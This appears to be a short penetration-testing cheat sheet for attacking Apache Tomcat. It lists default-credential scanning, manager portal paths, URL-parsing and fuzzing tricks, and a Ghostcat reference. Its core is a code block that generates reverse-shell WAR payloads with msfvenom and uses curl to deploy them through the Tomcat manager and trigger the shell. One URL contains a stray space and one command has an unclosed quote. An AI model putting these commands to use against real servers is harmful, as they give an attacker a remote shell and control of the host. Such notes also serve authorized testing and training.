# Apache Tomcat


## Vulnerabilities and Enumaration

Default password: metasploit module auxillary scanner! 

Administrator portal can host files
`/manager/`
`/manager-gui/`

nginx - tomcat observe url parsing `/..;/`

Fuzzing tomcat `////Admin` or `;/Admin`
#### Ghostcat

Upload should not necessarily require username and password
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war -o shell.war
# OR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war -o shell.war
# the FILE.jsp is catable in the .war shell 
curl -u '[USERNAME]:[PASSWORD]' --upload-file shell.war "http://$IP:8080/mana ger/text/deploy?path=/shell"
# Check the file
curl -u '[USERNAME]:[PASSWORD]' "http://$IP:8080/shell/$FILE.jsp
```

[Apache Ghostcat](https://medium.com/@sushantkamble/apache-ghostcat-cve-2020-1938-explanation-and-walkthrough-23a9a1ae4a23)